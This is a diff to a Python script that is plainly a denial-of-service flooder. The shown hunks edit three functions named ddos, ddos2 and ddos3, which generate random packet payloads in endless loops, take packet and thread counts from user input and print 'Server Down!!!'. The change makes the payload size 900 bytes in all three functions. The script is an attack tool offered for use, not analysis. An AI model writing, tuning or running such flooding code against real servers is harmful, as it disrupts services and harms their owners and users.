@@ -19,7 +19,7 @@ times = int(input(" \033[93m =====> PAKET\033[0m:"))
 threads = int(input(" \033[93m =====> THREADS\033[0m:"))
 os.system("clear")
 def ddos():
-  data = random._urandom(1450)
+  data = random._urandom(900)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -32,7 +32,7 @@ def ddos():
       print("[!] Server Down!!!")
 
 def ddos2():
-  data = random._urandom(818)
+  data = random._urandom(900)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
@@ -47,7 +47,7 @@ def ddos2():
       print("[!] Server Down!!!")
 
 def ddos3():
-  data = random._urandom(18)
+  data = random._urandom(900)
   i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
